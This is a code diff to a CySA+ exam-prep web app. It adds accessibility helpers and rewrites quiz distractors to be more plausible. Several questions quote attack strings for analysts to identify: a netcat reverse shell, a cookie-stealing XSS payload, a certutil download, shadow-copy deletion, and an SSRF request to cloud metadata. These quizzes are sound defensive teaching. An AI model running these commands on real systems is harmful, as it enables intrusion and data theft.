@@ -559,7 +559,7 @@ td.ed-val{color:var(--fg);font-family:var(--mono);font-size:13px}
 .pc-screen.s3,.pc-screen.s4,.pc-screen.s5,.pc-screen.s6{background:rgba(95,227,161,.1);color:var(--good);border-color:rgba(95,227,161,.5)}
 .mail{border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0;background:#f5f7fb;color:#1d2433}
 .mail-h{padding:12px 14px;border-bottom:1px solid #dde2ec;display:flex;flex-direction:column;gap:6px;font-size:14px}
-.mail-h .s-small{color:#6b7488;display:inline-block;width:56px}
+.mail-h .s-small{color:#586175;display:inline-block;width:56px}
 .mail-b{padding:12px 14px;font-size:14px}.mail-b p{margin:0 0 10px}
 .flag{font:inherit;color:inherit;background:none;border:1px dashed transparent;border-radius:4px;padding:1px 3px;cursor:pointer;text-align:left;word-break:break-word}
 .flag:hover{border-color:#aab3c6}
@@ -567,7 +567,7 @@ td.ed-val{color:var(--fg);font-family:var(--mono);font-size:13px}
 .flag.mail-btn{background:#2f6fe4;color:#fff;padding:8px 16px;border-radius:6px;font-weight:600}
 .flag.mail-btn.hit{background:#c63e60}
 .flag.mail-att{display:inline-flex;gap:8px;align-items:center;border:1px solid #cfd6e3;padding:6px 10px;border-radius:6px;background:#fff}
-.flag.mail-att .s-small{color:#6b7488}
+.flag.mail-att .s-small{color:#586175}
 .perm{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:12px 0}
 @media(max-width:560px){.perm{grid-template-columns:1fr}}
 .perm-col{display:flex;flex-direction:column;gap:8px}
@@ -1080,6 +1080,13 @@ table.vl tr.g-no td:first-child{box-shadow:inset 3px 0 0 var(--bad)}
 #viz-proc .hd-i .mono{overflow-wrap:anywhere;min-width:0}
 .dia button{min-width:0;overflow-wrap:anywhere}
 @media (max-width:520px){.dia button{padding:10px 4px;min-height:72px;font-size:13px}}
+
+/* ---------- Accessibility helpers ---------- */
+.sr-only{position:absolute!important;left:0;top:0;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0}
+.skip-link{position:absolute;left:12px;top:-60px;z-index:1000;padding:10px 16px;border-radius:8px;background:var(--accent);color:var(--on-accent);font-weight:600;text-decoration:none;transition:top .15s}
+.skip-link:focus{top:12px;outline:2px solid var(--on-accent);outline-offset:2px}
+main:focus{outline:none}
+[role="group"][tabindex="0"]:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
 
 /* practice exam upgrades: pace marker, pool info, domain drills */
 .ex-clockwrap{display:flex;flex-direction:column;align-items:center;line-height:1.15}
@@ -1970,6 +1977,40 @@ function boot(){
   addEventListener("hashchange",route);route();
 }
 
+/* ---------- Accessibility helpers ----------
+   Skip link, keyboard access to scrolling terminals, code and tables,
+   and screen-reader text for blank table header cells. */
+(function(){
+  const main=document.querySelector("main");
+  if(main&&!document.querySelector(".skip-link")){
+    main.id=main.id||"main";main.tabIndex=-1;
+    const a=document.createElement("a");a.className="skip-link";a.href="#"+main.id;a.textContent="Skip to main content";
+    a.addEventListener("click",e=>{e.preventDefault();main.focus();main.scrollIntoView()});
+    document.body.prepend(a);
+  }
+  const FOCUSABLE="a[href],button,input,select,textarea,[tabindex]";
+  const ALWAYS=".ios-out,.viz-scroll,pre,.term",IFSCROLL=".tbl-wrap,.tw";
+  const label=e=>e.matches("pre")?"Code sample":e.matches(".tbl-wrap,.tw")?"Scrollable table":"Terminal output";
+  const fix=()=>{
+    document.querySelectorAll(ALWAYS+","+IFSCROLL).forEach(e=>{
+      if(e.hasAttribute("tabindex")||e.querySelector(FOCUSABLE))return;
+      if(e.matches(IFSCROLL)&&e.scrollWidth<=e.clientWidth+1)return;
+      if(e.parentElement&&e.parentElement.closest(ALWAYS))return;
+      e.tabIndex=0;if(!e.hasAttribute("role"))e.setAttribute("role","group");
+      if(!e.hasAttribute("aria-label"))e.setAttribute("aria-label",label(e));
+    });
+    document.querySelectorAll("input:not([type=hidden]),select,textarea").forEach(e=>{
+      if((e.labels&&e.labels.length)||e.hasAttribute("aria-label")||e.hasAttribute("aria-labelledby"))return;
+      const t=e.previousElementSibling,txt=(t&&!t.matches("input,select,button,textarea")&&t.textContent.trim())||e.placeholder||e.title;
+      if(txt)e.setAttribute("aria-label",txt.slice(0,80));
+    });
+    document.querySelectorAll("th:empty").forEach(th=>{th.innerHTML='<span class="sr-only">Item</span>'});
+  };
+  let queued=false;
+  new MutationObserver(()=>{if(!queued){queued=true;requestAnimationFrame(()=>{queued=false;fix()})}}).observe(document.body,{childList:true,subtree:true});
+  fix();
+})();
+
 </script>
 <script>
 /* ================= Module 1: Security Operations (CS0-004 Domain 1.0, 34%) ================= */
@@ -2191,23 +2232,23 @@ const QUIZ=[
  {q:"Which MFA type is MOST resistant to phishing?",o:["FIDO2 security key","SMS one-time code","Email link","Push notification"],a:0,e:"FIDO2 binds the credential to the real site's origin."},
  {q:"Admins check out a vaulted domain admin password that is rotated after use, and the session is recorded. What is this?",o:["PAM","SSO","Federation","RBAC"],a:0,e:"Privileged access management."},
  {q:"A workstation connects to 91.215.85.4 every 60 seconds (±5 s), sending ~200 bytes each time, all night. What is this MOST likely?",o:["C2 beaconing","Windows Update","Port scanning","DNS caching"],a:0,e:"Regular, small, persistent check-ins are the signature of beaconing."},
- {q:"Why do attackers add jitter to beacons?",o:["To make the timing less regular and harder to detect","To speed up exfiltration","To encrypt the traffic","To avoid using DNS"],a:0,e:"Jitter randomizes the interval, but statistical analysis can still find it."},
+ {q:"Why do attackers add jitter to beacons?",o:["To make the timing less regular and harder to detect","To speed up exfiltration by sending data in bigger bursts","To encrypt the traffic","To avoid using DNS"],a:0,e:"Jitter randomizes the interval, but statistical analysis can still find it."},
  {q:"NetFlow shows one internal host contacting TCP 445 on 240 other workstations in 3 minutes. What does this indicate?",o:["A sweep for lateral movement or worm spread","Normal file sharing","A DDoS against the host","A rogue access point"],a:0,e:"One source, one port, many destinations: a sweep. SMB between workstations is irregular P2P."},
  {q:"A Raspberry Pi is found plugged into a conference room network jack. What is this?",o:["Rogue device","Honeypot","Jump box","Sensor"],a:0,e:"An unauthorized device on the network."},
- {q:"A file server suddenly uploads 80 GB to a cloud storage provider at 02:00. Which indicator is this?",o:["Unusual bandwidth consumption suggesting exfiltration","Beaconing","Port scan","Irregular P2P"],a:0,e:"Off-hours, large outbound volume suggests exfiltration."},
- {q:"Which is the BEST indicator of a cryptocurrency miner on a server?",o:["Sustained near-100% CPU with outbound connections to mining pools","Many failed logins","New DNS records","High disk free space"],a:0,e:"Miners consume processor resources."},
+ {q:"A file server suddenly uploads 80 GB to a cloud storage provider at 02:00. Which indicator is this?",o:["Unusual bandwidth consumption suggesting exfiltration","Beaconing to a command-and-control server on a fixed schedule","A port scan from the file server","Irregular peer-to-peer traffic"],a:0,e:"Off-hours, large outbound volume suggests exfiltration."},
+ {q:"Which is the BEST indicator of a cryptocurrency miner on a server?",o:["Sustained near-100% CPU with outbound connections to mining pools","Many failed logins from one external IP followed by a success","New DNS records","High disk free space"],a:0,e:"Miners consume processor resources."},
  {q:"EDR shows winword.exe spawned powershell.exe with an encoded command. What is MOST likely?",o:["A malicious macro executed","Normal Office behavior","A Windows update","A printer driver install"],a:0,e:"Office apps shouldn't launch PowerShell."},
  {q:"Which svchost.exe process is suspicious?",o:["One running from C:\\Users\\Public\\svchost.exe","One whose parent is services.exe","One in C:\\Windows\\System32","One running as LOCAL SERVICE"],a:0,e:"The real svchost runs from System32 and is started by services.exe."},
  {q:"Which Windows event ID shows that the security log was cleared?",o:["1102","4624","4688","7045"],a:0,e:"1102 = audit log cleared, a classic anti-forensics sign."},
  {q:"Which event ID records a new service being installed, often used for persistence?",o:["7045","4625","4720","4672"],a:0,e:"7045 = a service was installed."},
- {q:"Hundreds of 4625 events for many accounts from one IP, followed by a single 4624 logon type 10. What happened?",o:["A password attack succeeded and the attacker logged in over RDP","A service account locked out","Normal VPN use","A Kerberos ticket expired"],a:0,e:"Failures then a success; type 10 is RemoteInteractive (RDP)."},
+ {q:"Hundreds of 4625 events for many accounts from one IP, followed by a single 4624 logon type 10. What happened?",o:["A password attack succeeded and the attacker logged in over RDP","A service account's cached password expired and locked out, then it was reset","Normal VPN use","A Kerberos ticket expired"],a:0,e:"Failures then a success; type 10 is RemoteInteractive (RDP)."},
  {q:"Which event ID shows a user was added to the local Administrators group?",o:["4732","4624","1102","4698"],a:0,e:"4732: member added to a security-enabled local group."},
  {q:"A user's account signs in from Chicago and 12 minutes later from Singapore. What is this called?",o:["Impossible travel","MFA fatigue","Credential stuffing","Session fixation"],a:0,e:"Travel that physically can't happen in that time."},
  {q:"A user reports 30 MFA push notifications at 2 a.m. and accidentally approved one. What attack is this?",o:["MFA fatigue (push bombing)","Pass-the-hash","SIM swap","Vishing"],a:0,e:"Flooding pushes until the user taps Approve."},
  {q:"A sign-in log shows a valid session from a new country with no MFA prompt and no password entry. What's MOST likely?",o:["Stolen session token replay","Brute force","Password spraying","Kerberoasting"],a:0,e:"Replayed cookies skip authentication entirely."},
  {q:"After a BEC incident, which mailbox artifact should you check FIRST for attacker persistence?",o:["Inbox rules forwarding or deleting mail","Mailbox size","Calendar permissions only","Signature settings"],a:0,e:"Attackers add forwarding/delete rules to watch and hide conversations."},
- {q:"Cloud audit logs show CloudTrail logging disabled, then a new access key created for an admin user. What should the analyst conclude?",o:["Likely account compromise with defense evasion","Routine maintenance","A billing change","A misconfigured alert"],a:0,e:"Disabling logging before persistence is a strong attack indicator."},
- {q:"A web server process spawns /bin/sh and runs 'id; uname -a'. What is MOST likely?",o:["Remote code execution through a web vulnerability","Normal CGI","A cron job","Log rotation"],a:0,e:"Web servers don't normally spawn shells running recon commands."},
+ {q:"Cloud audit logs show CloudTrail logging disabled, then a new access key created for an admin user. What should the analyst conclude?",o:["Likely account compromise with defense evasion","Routine maintenance by the cloud team before a key rotation","A billing change","A misconfigured alert"],a:0,e:"Disabling logging before persistence is a strong attack indicator."},
+ {q:"A web server process spawns /bin/sh and runs 'id; uname -a'. What is MOST likely?",o:["Remote code execution through a web vulnerability","Normal CGI script behavior from a scheduled maintenance task","A cron job owned by the web user","Log rotation"],a:0,e:"Web servers don't normally spawn shells running recon commands."},
  {q:"A database server starts making outbound HTTPS connections to an IP in another country. Which indicator category fits BEST?",o:["Unexpected outbound communication","Service interruption","Bandwidth consumption","Rogue device"],a:0,e:"Database servers rarely initiate internet connections."},
  {q:"Which URL actually takes the user to evil.net?",o:["https://bank.com@evil.net/login","https://evil.net.bank.com/login","https://bank.com/evil.net","https://bank.com/?ref=evil.net"],a:0,e:"Everything before @ is treated as user info; the host is evil.net."},
  {q:"A link shows as https://xn--pple-43d.com. What should an analyst suspect?",o:["A homoglyph (look-alike Unicode) domain","An expired certificate","A URL shortener","A redirect loop"],a:0,e:"xn-- is punycode for an internationalized domain, often a look-alike."},
@@ -2221,11 +2262,11 @@ const QUIZ=[
  {q:"Before uploading a suspicious internal document to VirusTotal, what should you do FIRST?",o:["Search by its hash","Rename it","Zip it with a password","Email it to the vendor"],a:0,e:"Hash lookups don't expose content or tip off the attacker."},
  {q:"An analyst wants to see what a sample does when run, without risking production. What should they use?",o:["A sandbox","strings","A SIEM","A honeypot"],a:0,e:"Sandboxes detonate samples safely and record behavior."},
  {q:"Running strings on a binary reveals http://91.215.85.4/gate.php and 'cmd.exe /c'. What has the analyst found?",o:["Possible C2 URL and command execution capability","The binary's hash","The compiler version only","Its digital signature"],a:0,e:"strings exposes embedded URLs and commands."},
- {q:"Which command MOST strongly suggests ransomware preparing to prevent recovery?",o:["vssadmin delete shadows /all /quiet","ipconfig /all","whoami","net time"],a:0,e:"Deleting shadow copies removes local restore points."},
- {q:"What does 'certutil -urlcache -split -f http://x/a.exe a.exe' do?",o:["Downloads a file using a built-in Windows tool","Installs a certificate","Lists cached URLs only","Verifies a signature"],a:0,e:"A living-off-the-land download technique."},
+ {q:"Which command MOST strongly suggests ransomware preparing to prevent recovery?",o:["vssadmin delete shadows /all /quiet","wevtutil qe Security /c:5 /f:text","ipconfig /all","whoami"],a:0,e:"Deleting shadow copies removes local restore points."},
+ {q:"What does 'certutil -urlcache -split -f http://x/a.exe a.exe' do?",o:["Downloads a file using a built-in Windows tool","Installs a certificate into the machine's trusted root store","Lists cached URLs only","Verifies a signature"],a:0,e:"A living-off-the-land download technique."},
  {q:"An email's From is ceo@acme.com, Return-Path is bounce@mailer-x.ru, and SPF fails. What is MOST likely?",o:["Spoofed sender","A normal newsletter","A DKIM key rotation","A mailing list"],a:0,e:"Mismatched Return-Path and failed SPF point to spoofing."},
  {q:"In which order should you read Received: headers to trace an email from origin to destination?",o:["Bottom to top","Top to bottom","Alphabetically","By timestamp only"],a:0,e:"Each server adds a header on top, so the origin is at the bottom."},
- {q:"Which command lists the source IPs with the most failed SSH logins first?",o:["grep 'Failed' auth.log | awk '{print $11}' | sort | uniq -c | sort -nr","cat auth.log | sort","grep -v Failed auth.log","wc -l auth.log"],a:0,e:"Extract the field, sort, count duplicates, then sort numerically in reverse."},
+ {q:"Which command lists the source IPs with the most failed SSH logins first?",o:["grep 'Failed' auth.log | awk '{print $11}' | sort | uniq -c | sort -nr","grep 'Failed' auth.log | awk '{print $1}' | sort | uniq | head -n 10","cat auth.log | sort","wc -l auth.log"],a:0,e:"Extract the field, sort, count duplicates, then sort numerically in reverse."},
  {q:"What does grep -v 'Accepted' auth.log show?",o:["Every line that does NOT contain Accepted","Only lines with Accepted","The count of Accepted lines","Accepted lines, case-insensitive"],a:0,e:"-v inverts the match."},
  {q:"Which regex matches a US Social Security number like 123-45-6789?",o:["\\d{3}-\\d{2}-\\d{4}","[a-z]+@[a-z]+","^\\s*$","\\w{16}"],a:0,e:"3 digits, dash, 2 digits, dash, 4 digits."},
  {q:"A log line is {\"user\":\"jdoe\",\"action\":\"login\",\"result\":\"fail\"}. What format is it?",o:["JSON","XML","CSV","Syslog RFC 3164"],a:0,e:"Key-value pairs in braces: JSON."},
@@ -2239,10 +2280,10 @@ const QUIZ=[
  {q:"Which pair is a format and a transport for sharing threat intel?",o:["STIX and TAXII","JSON and XML","SAML and OAuth","SNMP and syslog"],a:0,e:"STIX describes intel; TAXII transports it."},
  {q:"Which is open-source intelligence?",o:["A CISA advisory and a researcher's blog post","A paid vendor feed","An ISAC member-only report","Internal EDR telemetry"],a:0,e:"OSINT is publicly available."},
  {q:"What makes threat hunting different from alert monitoring?",o:["It proactively assumes compromise and searches for undetected activity","It only reviews closed tickets","It relies on antivirus","It is done only after a breach is confirmed"],a:0,e:"Hunting doesn't wait for alerts."},
- {q:"Which is a well-formed hunting hypothesis?",o:["An attacker may be using scheduled tasks for persistence on finance workstations","Find hackers","Check all logs","Install more antivirus"],a:0,e:"Specific and testable against data."},
- {q:"Which hunting focus area is MOST often missed by monitoring?",o:["Isolated networks such as OT or lab segments","The main web server","The email gateway","The SIEM itself"],a:0,e:"Isolated networks are often outside normal monitoring."},
+ {q:"Which is a well-formed hunting hypothesis?",o:["An attacker may be using scheduled tasks for persistence on finance workstations","Search every log source for anything unusual across the whole company this week","Find hackers on the network","Install more antivirus"],a:0,e:"Specific and testable against data."},
+ {q:"Which hunting focus area is MOST often missed by monitoring?",o:["Isolated networks such as OT or lab segments","The main public web server and its load balancers","The email gateway","The SIEM itself"],a:0,e:"Isolated networks are often outside normal monitoring."},
  {q:"A fake 'backup_admin' account with no real use triggers an alert whenever anyone tries it. What is this?",o:["Honeytoken","Service account","Shadow account","Break-glass account"],a:0,e:"Decoy credentials that alert on use."},
- {q:"Why is any traffic to a honeypot suspicious?",o:["It has no legitimate users or business purpose","It runs old software","It's in the DMZ","It logs everything"],a:0,e:"No one should touch it, so every touch matters."},
+ {q:"Why is any traffic to a honeypot suspicious?",o:["It has no legitimate users or business purpose","It runs old software that always triggers alerts","It's in the DMZ","It logs everything"],a:0,e:"No one should touch it, so every touch matters."},
  {q:"Which SOC task is the BEST candidate for automation?",o:["Looking up every alert's IP and hash in threat intel","Deciding whether to notify regulators","Interviewing an insider suspect","Approving a firewall exception for executives"],a:0,e:"Repetitive, rule-based enrichment."},
  {q:"A tool sends an HTTP POST to SOAR the moment an EDR alert fires. What is this integration method?",o:["Webhook","Batch export","SNMP polling","Screen scraping"],a:0,e:"A webhook pushes an event when it happens."},
  {q:"Analysts waste time switching between eight consoles. Which improvement addresses this?",o:["A single pane of glass dashboard","More analysts","Longer log retention","A new firewall"],a:0,e:"One unified view."},
@@ -2254,16 +2295,16 @@ const QUIZ=[
  {q:"Attackers slip mislabeled samples into data a detection model learns from, so it ignores their malware. What is this?",o:["Model (data) poisoning","Prompt injection","Hallucination","Evasion by encryption"],a:0,e:"Corrupting training data."},
  {q:"Which is an appropriate use of AI in a SOC?",o:["Drafting a summary of an alert for an analyst to review","Automatically notifying regulators without review","Replacing all detection rules","Deciding employee discipline"],a:0,e:"AI assists; humans decide on impactful actions."},
  {q:"Which logging level would you expect to generate the MOST data?",o:["Debug","Critical","Error","Emergency"],a:0,e:"Debug records the most detail."},
- {q:"An analyst needs to know which program starts at every logon on a Windows host. Where should they look?",o:["Registry Run keys and scheduled tasks","The hosts file","DNS cache","The recycle bin"],a:0,e:"Run keys and tasks are classic autostart locations."},
+ {q:"An analyst needs to know which program starts at every logon on a Windows host. Where should they look?",o:["Registry Run keys and scheduled tasks","The hosts file and the DNS resolver cache","DNS cache","The recycle bin"],a:0,e:"Run keys and tasks are classic autostart locations."},
  {q:"Where are Linux authentication logs typically found on Debian/Ubuntu?",o:["/var/log/auth.log","/etc/passwd","/home/user/.bashrc","/tmp/auth"],a:0,e:"auth.log records SSH and sudo activity."},
  {q:"Which technology lets a central controller program the network so policy follows workloads?",o:["SDN","SASE","VDI","NAT"],a:0,e:"Software-defined networking."},
  {q:"Which identity attack is MOST effectively stopped by number matching on push MFA?",o:["MFA fatigue","SQL injection","Pass-the-ticket","DNS tunneling"],a:0,e:"Users must type a number shown at sign-in, so blind approvals fail."},
- {q:"DNS queries with long, random-looking subdomains sent directly to an external resolver suggest:",o:["DNS tunneling or exfiltration","Normal CDN use","A DHCP failure","NTP drift"],a:0,e:"Encoded data hidden in DNS labels."},
- {q:"Which BEST describes user and entity behavior analytics (UEBA)?",o:["Comparing activity to each user's or device's own baseline","Scanning for CVEs","Blocking known-bad IPs","Encrypting logs"],a:0,e:"Behavioral anomaly detection."},
+ {q:"DNS queries with long, random-looking subdomains sent directly to an external resolver suggest:",o:["DNS tunneling or exfiltration","Normal CDN use by the browser","A DHCP failure","NTP drift"],a:0,e:"Encoded data hidden in DNS labels."},
+ {q:"Which BEST describes user and entity behavior analytics (UEBA)?",o:["Comparing activity to each user's or device's own baseline","Scanning hosts for CVEs and comparing them with each asset's baseline","Blocking known-bad IPs","Encrypting logs"],a:0,e:"Behavioral anomaly detection."},
  {q:"A SIEM correlation rule fires when 5+ failed logins are followed by a success from the same IP within 10 minutes. What is the rule detecting?",o:["A successful password attack","Normal logons","Port scans","Malware beaconing"],a:0,e:"Failures then success."},
- {q:"Which file type is MOST commonly used to deliver macro malware?",o:[".docm / .xlsm Office files",".txt files",".png images",".csv files"],a:0,e:"Macro-enabled Office documents."},
- {q:"Which source would MOST quickly tell you an IP is a known TOR exit node or scanner?",o:["IP reputation services such as AbuseIPDB","WHOIS for a domain","strings","A sandbox"],a:0,e:"Reputation lookups."},
- {q:"Why should threat intel be rated for relevancy?",o:["Intel about threats that don't apply to your environment wastes effort","Relevant intel is always free","Relevancy determines CVSS","It's required by STIX"],a:0,e:"Focus on what applies to you."},
+ {q:"Which file type is MOST commonly used to deliver macro malware?",o:[".docm / .xlsm Office files",".txt files with long lines",".png images",".csv files"],a:0,e:"Macro-enabled Office documents."},
+ {q:"Which source would MOST quickly tell you an IP is a known TOR exit node or scanner?",o:["IP reputation services such as AbuseIPDB","WHOIS lookups for the domain that resolves to the IP","strings","A sandbox"],a:0,e:"Reputation lookups."},
+ {q:"Why should threat intel be rated for relevancy?",o:["Intel about threats that don't apply to your environment wastes effort","Relevant intel is always free, while irrelevant feeds cost more to license","Relevancy determines CVSS","It's required by STIX"],a:0,e:"Focus on what applies to you."},
  {q:"Which is the BEST example of a webhook integration?",o:["EDR posts an alert to the SOAR platform the instant it fires","An analyst exports CSVs weekly","A cron job deletes logs","A printer sends email"],a:0,e:"Event-driven push."}
 ];
 
@@ -2711,10 +2752,10 @@ const QUIZ=[
  {q:"Which tool maps relationships between domains, email addresses and people from OSINT?",o:["Maltego","Nessus","GDB","ZAP"],a:0,e:"Maltego is a link-analysis OSINT tool."},
  {q:"Which tools are vulnerability scanners?",o:["Nessus and OpenVAS","GDB and Immunity","Maltego and Recon-ng","Wireshark and tcpdump"],a:0,e:"Nessus and OpenVAS scan for known vulnerabilities."},
  {q:"A web log shows: GET /item.php?id=10%20UNION%20SELECT%20username,password%20FROM%20users. What attack?",o:["SQL injection","XSS","Directory traversal","CSRF"],a:0,e:"UNION SELECT pulls data from another table."},
- {q:"A web log shows: GET /search?q=&lt;script&gt;document.location='http://x/?c='+document.cookie&lt;/script&gt;. What attack?",o:["Reflected XSS stealing cookies","SQL injection","SSRF","LFI"],a:0,e:"Script in a parameter, reflected back to the victim."},
+ {q:"A web log shows: GET /search?q=&lt;script&gt;document.location='http://x/?c='+document.cookie&lt;/script&gt;. What attack?",o:["Reflected XSS stealing cookies","SQL injection through the q parameter","SSRF","LFI"],a:0,e:"Script in a parameter, reflected back to the victim."},
  {q:"A forum post containing a script runs in every visitor's browser. What type of XSS?",o:["Stored (persistent)","Reflected","DOM-based","Blind SQLi"],a:0,e:"It's saved on the server."},
  {q:"GET /download?file=../../../../etc/passwd indicates:",o:["Directory traversal","XSS","CSRF","Integer overflow"],a:0,e:"../ climbs out of the web root."},
- {q:"A request to /fetch?url=http://169.254.169.254/latest/meta-data/iam/ suggests:",o:["SSRF targeting cloud metadata credentials","XSS","CSRF","Brute force"],a:0,e:"SSRF makes the server call the metadata service."},
+ {q:"A request to /fetch?url=http://169.254.169.254/latest/meta-data/iam/ suggests:",o:["SSRF targeting cloud metadata credentials","Stored XSS that steals session cookies","CSRF against the metadata API","Brute force of IAM keys"],a:0,e:"SSRF makes the server call the metadata service."},
  {q:"A user visits a malicious page that silently submits a funds transfer to their bank, where they're logged in. What attack?",o:["CSRF","SSRF","Stored XSS","SQL injection"],a:0,e:"The browser sends the victim's cookies with the forged request."},
  {q:"Which BEST prevents CSRF?",o:["Anti-CSRF tokens and SameSite cookies","Input length limits","Disabling TLS","Parameterized queries"],a:0,e:"Tokens prove the request came from the real site."},
  {q:"A form field input of '; nc -e /bin/sh 203.0.113.5 4444' indicates:",o:["Command injection","XSS","Directory traversal","LDAP injection"],a:0,e:"A semicolon chains an OS command (a reverse shell)."},
@@ -2729,15 +2770,15 @@ const QUIZ=[
  {q:"An attacker repeatedly submits false fraud reports to a retailer's ML model so it starts flagging legitimate customers. What is this?",o:["Data poisoning","Prompt injection","SQL injection","Overflow"],a:0,e:"Corrupting the data a system learns from."},
  {q:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H. What does AV:N mean?",o:["Exploitable remotely over the network","Requires physical access","No availability impact","No authentication"],a:0,e:"Attack vector: network."},
  {q:"A CVSS score of 7.4 is rated:",o:["High","Medium","Critical","Low"],a:0,e:"7.0-8.9 is high."},
- {q:"What does Scope: Changed (S:C) mean in CVSS?",o:["Exploiting it affects resources beyond the vulnerable component","The patch changed","The scan scope changed","The CVE was updated"],a:0,e:"For example, a VM escape affecting the hypervisor."},
+ {q:"What does Scope: Changed (S:C) mean in CVSS?",o:["Exploiting it affects resources beyond the vulnerable component","The vendor changed the patch after release, so you must rescan everything","The scan scope changed","The CVE was updated"],a:0,e:"For example, a VM escape affecting the hypervisor."},
  {q:"Which metric was ADDED in CVSS v4.0?",o:["Attack requirements","Attack vector","User interaction","Privileges required"],a:0,e:"v4.0 adds Attack Requirements (AT)."},
  {q:"A scanner reports a missing patch, but the admin shows it was installed and the scanner misread the version. This is a:",o:["False positive","False negative","True positive","True negative"],a:0,e:"Reported but not real."},
  {q:"Which scan result is MOST dangerous?",o:["False negative","False positive","True negative","True positive"],a:0,e:"A real flaw nobody knows about."},
  {q:"Two findings are both CVSS 9.8. One is on an isolated lab server, the other on an internet-facing VPN appliance listed in CISA KEV. Which first?",o:["The VPN appliance","The lab server","Whichever is older","Both at the same time, always"],a:0,e:"Exposure plus active exploitation."},
- {q:"What does EPSS estimate?",o:["The probability a vulnerability will be exploited soon","The cost of a breach","The CVSS base score","Patch download time"],a:0,e:"Exploit Prediction Scoring System."},
- {q:"What is the CISA KEV catalog?",o:["A list of vulnerabilities known to be exploited in the wild","A list of all CVEs","A patch download site","A malware sandbox"],a:0,e:"Prioritize anything on KEV."},
+ {q:"What does EPSS estimate?",o:["The probability a vulnerability will be exploited soon","The expected cost of a breach caused by the flaw","The CVSS base score","Patch download time"],a:0,e:"Exploit Prediction Scoring System."},
+ {q:"What is the CISA KEV catalog?",o:["A list of vulnerabilities known to be exploited in the wild","A list of every CVE published, with its CVSS base score and vendor","A patch download site","A malware sandbox"],a:0,e:"Prioritize anything on KEV."},
  {q:"A vendor confirms a flaw being exploited but has no patch yet. What should the team do?",o:["Apply compensating controls and increase monitoring","Wait for the patch","Accept the risk without documentation","Uninstall the scanner"],a:0,e:"Zero-day: mitigate and watch."},
- {q:"Which factor raises a vulnerability's priority the MOST beyond its CVSS base score?",o:["Public exploit code and an internet-exposed, high-value asset","A long CVE description","The scanner vendor","The finding's age only"],a:0,e:"Context: exploitability, exposure and asset value."},
+ {q:"Which factor raises a vulnerability's priority the MOST beyond its CVSS base score?",o:["Public exploit code and an internet-exposed, high-value asset","A long CVE description and a high number of references in the NVD entry","The scanner vendor","The finding's age only"],a:0,e:"Context: exploitability, exposure and asset value."},
  {q:"Which BEST prevents SQL injection?",o:["Parameterized queries","Output encoding","Client-side validation only","Hiding error messages"],a:0,e:"Prepared statements separate code from data."},
  {q:"Which BEST prevents stored XSS when displaying user comments?",o:["Context-aware output encoding","Parameterized queries","TLS","Rate limiting"],a:0,e:"Encode output for HTML context."},
  {q:"Why must input validation happen on the server?",o:["Client-side checks can be bypassed","Servers are faster","Browsers don't support validation","It's required by TLS"],a:0,e:"Attackers can send requests without the browser."},
@@ -2752,12 +2793,12 @@ const QUIZ=[
  {q:"A 'Warning: this system is monitored' login banner is which function?",o:["Deterrent","Corrective","Detective","Compensating"],a:0,e:"It discourages misuse."},
  {q:"What should happen right after a patch is deployed?",o:["Validation, such as a rescan","Delete the change ticket","Disable logging","Nothing"],a:0,e:"Confirm the vulnerability is gone."},
  {q:"Why test patches on a pilot group first?",o:["To catch compatibility problems before a broad rollout","To save licenses","Because scanners require it","To skip change management"],a:0,e:"Patches can break things."},
- {q:"A server can't be patched for 60 days because of a vendor dependency. What's the correct process?",o:["Document an exception with an owner, compensating controls and expiry date","Ignore it","Delete it from the scanner","Lower its CVSS score"],a:0,e:"Exceptions must be formal and time-bound."},
+ {q:"A server can't be patched for 60 days because of a vendor dependency. What's the correct process?",o:["Document an exception with an owner, compensating controls and expiry date","Remove the server from the scanner's scope until the vendor releases a fix","Ignore it","Lower its CVSS score"],a:0,e:"Exceptions must be formal and time-bound."},
  {q:"A company buys cyber insurance to cover breach costs. Which risk response?",o:["Transfer","Accept","Avoid","Mitigate"],a:0,e:"Financial impact shifts to the insurer."},
  {q:"A company shuts down a risky legacy FTP service entirely. Which risk response?",o:["Avoid","Transfer","Accept","Mitigate"],a:0,e:"Stop the activity that causes the risk."},
  {q:"Leadership signs off on a low-severity finding because fixing it costs more than the potential loss. Which response?",o:["Accept","Avoid","Transfer","Mitigate"],a:0,e:"Documented acceptance."},
  {q:"A policy says critical vulnerabilities must be fixed within 15 days. What is this?",o:["A remediation SLO/SLA","A KPI for the help desk","A CVSS metric","A rules of engagement clause"],a:0,e:"Service-level objectives set remediation timelines."},
- {q:"Certificate transparency logs reveal 'dev-old.acme.com' that nobody remembers. What practice found it?",o:["Passive discovery for attack surface management","Credentialed scanning","Fuzzing","Static analysis"],a:0,e:"Passive discovery doesn't touch the target."},
+ {q:"Certificate transparency logs reveal 'dev-old.acme.com' that nobody remembers. What practice found it?",o:["Passive discovery for attack surface management","Credentialed vulnerability scanning of the DMZ","Fuzzing","Static analysis"],a:0,e:"Passive discovery doesn't touch the target."},
  {q:"What must be agreed in writing before a penetration test?",o:["Rules of engagement and scope","The final report","The CVSS scores","The patch schedule"],a:0,e:"Authorization, scope and limits."},
  {q:"A red team copies the exact TTPs of a known ransomware group. What is this?",o:["Adversary emulation","Bug bounty","Vulnerability scanning","Tabletop exercise"],a:0,e:"Emulating a specific adversary."},
  {q:"Which BEST reduces the attack surface?",o:["Decommissioning unused internet-facing services","Adding more logs","Buying a SIEM","Raising CVSS thresholds"],a:0,e:"Remove what doesn't need to be exposed."},
@@ -2765,10 +2806,10 @@ const QUIZ=[
  {q:"Nmap shows 22/tcp closed. What does that mean?",o:["The host answered, but nothing listens on 22","A firewall dropped the probe","SSH is vulnerable","The host is down"],a:0,e:"Closed means reachable with no service."},
  {q:"Which Nmap scan type sends SYN and never completes the handshake?",o:["-sS","-sT","-sU","-sn"],a:0,e:"SYN half-open scan."},
  {q:"A scanner flags a vulnerability only from the service banner. What should you do before escalating?",o:["Validate with a credentialed check or manual verification","Patch immediately without checking","Ignore it","Raise the CVSS score"],a:0,e:"Banner checks cause false positives."},
- {q:"What is a key advantage of DAST over SAST?",o:["It finds issues in the running app, including configuration problems","It needs source code","It runs before code is written","It never has false positives"],a:0,e:"Dynamic testing sees runtime behavior."},
